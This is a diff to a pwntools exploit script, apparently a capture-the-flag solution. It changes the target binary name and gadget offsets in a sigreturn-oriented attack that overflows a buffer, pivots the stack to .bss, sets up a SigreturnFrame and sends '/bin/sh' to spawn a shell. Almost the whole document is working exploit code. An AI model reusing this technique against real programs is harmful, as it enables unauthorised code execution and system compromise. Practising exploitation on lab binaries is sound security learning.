@@ -1,7 +1,7 @@
 from pwn import *
 
-p=process("./testest")
-e=ELF("./testest")
+p=process("./862ef11b7b9c81837bed9f30bda791c440ae4ef5045bbda477cad3126c37174c")
+e=ELF("./862ef11b7b9c81837bed9f30bda791c440ae4ef5045bbda477cad3126c37174c")
 context.clear(arch='amd64')
 
 def slog(name, addr): return success(': '.join([name, hex(addr)]))
@@ -11,7 +11,7 @@ pause()
 
 #eax_0=e.symbols["main"]+60
 main=e.symbols["main"]
-syscall=main+58
+syscall=main+62
 bss=e.bss()+0x100
 binsh=b"/bin/sh\x00"
 
@@ -24,7 +24,7 @@ frame1.rdi=0
 frame1.rsi=bss
 frame1.rdx=0
 
-p.send(b'A'*0x10+p64(bss+0x10)+p64(main+24)+b'B'*0x8+p64(syscall)+bytes(frame1))
+p.send(b'A'*0x10+p64(bss+0x10)+p64(main+28)+b'B'*0x8+p64(syscall)+bytes(frame1))
 pause()
 p.send(binsh+b'C'*7)
 pause()
